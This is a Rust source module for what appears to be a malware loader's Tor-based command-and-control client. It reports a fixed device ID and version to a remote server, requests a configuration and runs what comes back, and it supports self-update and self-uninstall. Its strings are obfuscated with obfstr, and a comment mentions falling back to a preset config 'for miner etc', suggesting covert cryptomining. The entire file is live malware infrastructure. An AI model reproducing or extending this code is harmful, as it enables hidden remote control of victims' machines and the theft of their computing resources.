use std::sync::{ Arc, RwLock };
use anyhow::{ Context, Result };
use loader_vars::{
    constants::loader_version,
    types::{
        receive::{ self, ClientParams, LoaderReceivePayload },
        send::{ GetConfigParams, LoaderSendPayload, ServerAction, ServerParams },
    },
};
use shared::network::tor::{ LoggerConfig, ServerReceiveType, TorHandler };
use obfstr::obfstr as s;
use super::utils::run_config;

#[derive(Clone)]
pub struct LoaderTorHandler {
    tor_handler: TorHandler,
}

impl LoaderTorHandler {
    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
        let tor_handler = TorHandler::new(logger_config).await?;
        Ok(LoaderTorHandler { tor_handler })
    }

    pub async fn run_handler(&mut self) {
        let self_clone = Arc::new(RwLock::new(self.clone()));
        let self_clone2 = self_clone.clone();

        //? if cannot connect to tor - run prewritten runconfig ( for miner etc ) still needed
        //? ok so if in 10 min we dont connect we run predefined - do inside tor handler

        self.tor_handler.run(
            move || {
                Self::connect_callback_init(self_clone.clone());
            },
            move |handler, data| { Self::process_data(handler.clone(), data, self_clone2.clone()) }
        ).await;
    }
    pub fn connect_callback_init(self_ref: Arc<RwLock<Self>>) {
        let self_guard = self_ref.read().unwrap();
        let params = GetConfigParams {};
        if
            let Err(_error) = Self::send_data(
                &self_guard.tor_handler,
                ServerAction::GetConfig,
                ServerParams::GetConfig(params)
            )
        {
            // err
        }
    }

    fn process_data(
        tor_handler: TorHandler,
        binary_data: Vec<u8>,
        self_ref: Arc<RwLock<Self>>
    ) -> Result<()> {
        let processed_data: LoaderReceivePayload = serde_json
            ::from_slice(&binary_data)
            .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;

        Self::route_data(tor_handler, processed_data, self_ref)
    }

    fn route_data(
        _tor_handler: TorHandler,
        processed_data: LoaderReceivePayload,
        _self_ref: Arc<RwLock<Self>>
    ) -> Result<()> {
        match processed_data.action {
            receive::ClientAction::RunConfig => {
                if let ClientParams::RunConfig(params) = processed_data.params {
                    run_config(params)?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::UninstallSelf => {}
            receive::ClientAction::UpdateSelf => {}
        }
        Ok(())
    }
    fn send_data(
        tor_handler: &TorHandler,
        action: ServerAction,
        params: ServerParams
    ) -> Result<()> {
        let payload = LoaderSendPayload {
            id: tor_handler.constant_device_id.read().unwrap().to_owned(),
            version: loader_version(),
            action,
            params,
        };

        let binary_data = serde_json
            ::to_vec(&payload)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;

        tor_handler.add_to_send_queue(ServerReceiveType::Loader, binary_data)
    }
}
